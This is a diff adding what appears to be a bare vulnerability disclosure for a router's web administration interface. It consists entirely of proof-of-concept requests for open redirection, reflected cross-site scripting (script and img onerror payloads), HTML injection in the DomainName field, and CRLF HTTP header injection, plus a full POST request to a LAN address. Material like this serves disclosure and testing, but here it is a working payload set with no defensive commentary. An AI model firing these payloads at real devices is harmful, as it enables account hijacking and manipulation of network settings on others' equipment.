@@ -1,0 +1,34 @@
+URL Redirection:
+http://www.example.com/goform/formWirelessTbl?submit-url=http://www.google.de
+
+http://www.example.com/goform/formWlanSetup?apMode=0&amp;band=2&amp;ssid=test&amp;chan=11&amp;macAddrValue=5C260A2BF03F&amp;wlanMacClone=0&amp;wlanMac=000000000000&amp;autoMacClone=no&amp;repeaterSSID=&amp;wlLinkMac1=000000000000&amp;wlLinkMac2=000000000000&amp;wlLinkMac3=000000000000&amp;wlLinkMac4=000000000000&amp;wlLinkMac5=000000000000&amp;wlLinkMac6=000000000000&amp;x=57&amp;y=20&amp;wlan-url=http://www.pwnd.pwnd
+
+Cross-site scripting:
+http://www.example.com/goform/formWlanSetup?apMode=0&amp;band=2&amp;ssid=&amp;chan=11&amp;macAddrValue=&amp;wlanMacClone=0&amp;wlanMac=&amp;autoMacClone=no&amp;repeaterSSID=&amp;wlLinkMac1=&amp;wlLinkMac2=&amp;wlLinkMac3=&amp;wlLinkMac4=&amp;wlLinkMac5=&amp;wlLinkMac6=&amp;x=54&amp;y=12&amp;wlan-url=test&gt;&lt;script&gt;alert(&#039;XSSed&#039;)&lt;/script&gt;test
+
+HTML injection:
+http://www.example.com/goform/formTcpipSetup?oldpass=&amp;newpass=&amp;confpass=&amp;ip=www.example.com&amp;mask=255.255.255.0&amp;gateway=0.0.0.0&amp;dhcp=2&amp;DhcpGatewayIP=0.0.0.0&amp;DhcpNameServerIP=0.0.0.0&amp;dhcpRangeStart=www.example.com&amp;dhcpRangeEnd=www.example.com&amp;DomainName=&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&amp;leaseTimeGet=946080000&amp;leaseTime=946080000&amp;B1.x=52&amp;B1.y=21&amp;submit-url=%2Fsysutility.asp&amp;ipChanged=
+
+Example Request:
+POST /goform/formWlanSetup HTTP/1.1
+Host: 192.168.178.175
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 
+Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.175/wlbasic.asp
+Authorization: Basic xxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 351
+
+apMode=0&band=2&ssid=%22%3E%3Cimg+src%3D%220%22+onerror%3Dalert%281%29%3E&chan=11&macAddrValue=5C260A2BF03F&wlanMacClone=0&wlanMac=000000000000&autoMacClone=no&repeaterSSID=&wlLinkMac1=000000000000&wlLinkMac2=000000000000&wlLinkMac3=000000000000&wlLinkMac4=000000000000&wlLinkMac5=000000000000&wlLinkMac6=000000000000&x=50&y=20&wlan-url=%2Fwlbasic.asp
+
+HTTP Header Injection:
+http://www.example.com/goform/formWirelessTbl?submit-url=e82f5%0d%0aNew%20Header:%20PWND
+
+
+
+
+
